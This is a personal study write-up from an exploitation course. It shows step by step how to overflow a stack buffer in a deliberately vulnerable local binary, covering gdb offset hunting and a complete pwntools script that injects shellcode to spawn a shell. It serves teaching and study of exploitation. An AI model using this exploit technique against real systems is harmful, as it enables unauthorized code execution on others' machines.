
This is part II of my notes while working through [TsarSec's Course]() on [binary-exploitation](/cybersecurity/TTPs/exploitation/binary-exploitation/buffer-overflow.md). You can find part I [here](https://trshpuppy.github.io/portfolio/writeups/binary-exploitation).
# Overflowing the Buffer
Now that we have an idea of how the stack is manipulated during a program's runtime, we want to hijack the control flow in order to exploit the program.

With all of the mitigations turned off (flags we can give to `gcc` during compilation) *the stack is readable, writable, and executable (`rwx`).* We can check this by using the `info proc mappings` command in `gdb`.
```bash
(gdb) info proc mappings
...                                                       # ----+
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]
```
This means that data we write to the stack can be executed by the CPU. So how do we know where to put our exploit so the CPU will execute it?
## Finding the `%rip` offset
Our target will be the saved `rip` frame on the stack (from the Function Prologue). Here's our stack from part I for reference:
![](/cybersecurity/cybersecurity-pics/buffer-overflow-11.png)
The saved RIP frame holds the address *where the CPU will resume execution* after the `overflow()` function returns and is popped off the stack. Whatever address the saved RIP is inhabiting is where we want to put our malicious code. So we need to figure out the offset (in bytes) from our entrance point (`name`) and the saved RIP (at `0x7fffffffddd0`).

Remember from our overflow c script:
```c
void overflow() {
    char option[0x2];
    char name[0x100];
    int MAGIC = 0xe4ff;
```
`option` is 0x2 bytes, and `name` is 0x100 bytes. We don't care about the length of `MAGIC` because when we overflow `name` *our data will be written to the stack from lower addresses to higher* (i.e. it will be written in the direction of the saved RIP frame):
![](writeups/writeup-pics/Pasted%20image%2020231121132658.png)
Theoretically, if we know the address and length of `name` as well as the address and length of `option` we could build our buffer with the exact right length. However, because of stack alignment, these variables might be bigger than 0x100 bytes.
### Building the Buffer
So, we know that `name` is *at least 0x100 bytes*, so our payload will have to be at least that long to overflow the borders of `name`. To visualize our payload (the string we're going to give `name`), here's a diagram:
![](/writeups/writeup-pics/Pasted%20image%2020231121133242.png)
So just the letter `A` 0x100 times, should be enough to overflow `name`.

In `gdb` we want to be able to see our overflow. If the string is just a bunch of `As` it will be difficult to tell at what byte length we were able to overflow the saved RIP. So, we'll add another character to the end of our string, `B`. So our buffer string will look something lie this:
```bash
name = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(* 0x100)...BBBBBBBBB(* 64)'
```
We can generate this payload using python:
```python
┌──(hakcypuppy㉿kali)-[~/tsar]
└─$ python3                                                                           
Python 3.11.5 (main, Aug 29 2023, 15:31:31) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> b"A"*0x100 + b"B"*64
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
>>>
```
### Testing the Buffer
Let's try this buffer as an input in our vulnerable program w/ `gdb`:
```bash
┌──(hakcypuppy㉿kali)-[~/tsar]
└─$ gdb ./vuln_1
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln_1...
(No debugging symbols found in ./vuln_1)
(gdb) run
Starting program: /home/hakcypuppy/tsar/vuln_1 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hey, whats your name!?

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Welcome
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

is this name correct? (y/n)?
y

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011f8 in overflow ()
(gdb)
```
When we confirm the input with `y` it crashes the vulnerable program and `gdb` reports receiving a `SIGSEV` [signal](/computers/linux/linux-processes.md).
### Examining the Stack
Let's look at the stack starting with our target `%rsp` (the saved RIP). We're looking for a bunch of `41`s and/or `42`s (the char codes for `A` and `B`):
```bash
(gdb) x/32gx $rsp # (the saved rip)
0x7fffffffddd8: 0x4242424242424242      0x4242424242424242
0x7fffffffdde8: 0x4242424242424242      0x4242424242424242
0x7fffffffddf8: 0x4242424242424242      0x000000010000000a
0x7fffffffde08: 0x00007fffffffdef8      0x00007fffffffdef8
0x7fffffffde18: 0x371cbd3ecbb9f447      0x0000000000000000
...
```
We're using `x/32gx $rsp` which means 'examine 32 giant words starting at the address in the `rsp` register'. The top 3 addresses are filled or partially filled with `0x4242424242424242` which denotes our `B` characters in our buffer!

At the moment the program crashed, our stack pointer was pointing to `0x7fffffffddd8`. We can check the instruction we crashed on by examining the `rip` register:
```bash
(gdb) x/i $rip
=> 0x4011f8 <overflow+178>:     ret
(gdb) 
```
It's set to the address `0x4011f8` which is the `ret` (return) instruction from `overflow()` (the last instruction).
#### The `ret` instruction
The job of the return instruction is to pop 8 bytes off the top of the stack (where `$rsp` is pointing), and execute the code at the address stored in there.

This would normally point back to the saved instruction pointer, but we've overwritten that with our buffer. In fact, we've overwritten that + 32 bytes worth of `B`s (each `B` is one byte) past that.

So, to adjust our buffer we need `0x100 + (64 - 32 - 8)` bytes worth of filler to reach the `saved rip` where we'll put our exploit (280 bytes).
### Verifying our Buffer
To verify we have the correct buffer, let's crash the program again, but this time using a buffer of 280 `A`s + 8 `B`s:
```python
┌──(hakcypuppy㉿kali)-[~/tsar]
└─$ python
Python 3.11.5 (main, Aug 29 2023, 15:31:31) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> b'A'*280 + b'B'*8
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'
>>>
```
```bash
┌──(hakcypuppy㉿kali)-[~/tsar]
└─$ gdb ./vuln_1
run
Starting program: /home/hakcypuppy/tsar/vuln_1 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hey, whats your name!?

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
Welcome 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

is this name correct? (y/n)?
y

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011f8 in overflow ()
(gdb) x/32xg $rsp
0x7fffffffddd8: 0x4242424242424242      0x000000000000000a
0x7fffffffdde8: 0x00007ffff7df16ca      0x0000000000000000
0x7fffffffddf8: 0x00000000004011f9      0x0000000100000000
0x7fffffffde08: 0x00007fffffffdef8      0x00007fffffffdef8
...
```
From this output we can tell our 8 `B`s land directly in the first byte of the `rsp` or saved RIP. So now we're sure there are 280 bytes between our `name` parameter in `overflow()` and the saved RIP.
## Building our Exploit
Now that we know the exact byte offset between our `name` parameter and the saved RIP, we can craft our exploit. Right now, our string looks something like this:
![](/writeups/writeup-pics/Pasted%20image%2020231121160423.png)
The 8 `B`s at the end overwrite the first byte of the saved RIP. So, let's replace the `B`s with an address we're in control of so we can tell the CPU to jump to that address and execute our malicious code.
### Exploit Code
For simplicity, we can put our shell code at the beginning of our buffer string. The beginning address of our code will be the address we put into the position which is being placeheld by the 8 `B`s right now.

When we're done our buffer will look something like this:
![](/writeups/writeup-pics/Pasted%20image%2020231121161123.png)
Instead of doing the math and crafting this string ourselves, we can take advantage of [python](/coding/languages/python.md) and [pwntools](https://docs.pwntools.com/en/stable/). If you need help finding and installing these tools, go check out [TsarSec's Course](https://taggartinstitute.org/courses/an-oral-history-of-binary-exploitation-defenses/) (it's free and awesome!)
#### Finding the address
To find the address of where our shellcode will land, we can use the `x` command in `gdb` and just ask to examine 280 - 16 bytes from the `$rsp` (we want to see 16 bytes past just to make sure the address is where we think it is):
```bash
(gdb) x/32xg $rsp-280-16
0x7fffffffdcb0: 0x0000000000403148      0x00000000004011dc
0x7fffffffdcc0: 0x4141414141414141      0x4141414141414141 # <---
0x7fffffffdcd0: 0x4141414141414141      0x4141414141414141
0x7fffffffdce0: 0x4141414141414141      0x4141414141414141
0x7fffffffdcf0: 0x4141414141414141      0x4141414141414141
0x7fffffffdd00: 0x4141414141414141      0x4141414141414141
0x7fffffffdd10: 0x4141414141414141      0x4141414141414141
0x7fffffffdd20: 0x4141414141414141      0x4141414141414141
...
```
From this we can see that our buffer *started at `0x7fffffffdcc0`*, so that's our target address for the shell code.
### Python & Pwntools
This is our exploit script:
```python
#!/usr/bin/env python3 
from pwn import *

# we overflow saved rip after 280 or 0x118 bytes
overflow_offset_rip = 0x118

# we point saved rip to the address of the start of our buffer
new_rip = 0x7fffffffdcc0

# construct shellcode 
# let pwntools know we're dealing with a 64-bit target
context.update(arch="amd64")

# assemble shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# construct payload 
payload = shellcode                                      # shellcode
payload += b"A" * (overflow_offset_rip - len(shellcode)) # fill up buffer to 280 bytes
payload += p64(new_rip)                                  # pack little endian

# connect to the vulnerable program
p = process("./vuln_1")

# send payload
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
```
All we have to do is set our offset in `overflow_offset_rip`, set `new_rip` to the start of our buffer (the address of our shellcode). What we're going to send to the vulnerable program looks essentially like this:
![](/writeups/writeup-pics/Pasted%20image%2020231121173335.png)
## Exploit it Yo!
All you have to do now is `chmod +x` your exploit script and then run it. It will start the vulnerable process and send the exploit:
```bash
┌──(hakcypuppy㉿kali)-[~/tsar]
└─$ ./exploit.py                                                                                    
[+] Starting local process './vuln_1': pid 1284173
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ whoami
hakcypuppy
$
```

> My previous notes (linked in text):
 -   You'll find them all [here](https://github.com/TrshPuppy/obsidian-notes)

> [!Resources]
> - [Wikipedia: Buffer Overflows](https://en.wikipedia.org/wiki/Stack_buffer_overflow)
> - [TsarSec: Oral History of Binary Exploitation](https://taggartinstitute.org/courses/an-oral-history-of-binary-exploitation-defenses)
> - [Scott Wolchok: How to Read Assembly](https://wolchok.org/posts/how-to-read-assembly-language/)
> - [Python Pwntools](https://docs.pwntools.com/en/stable/)

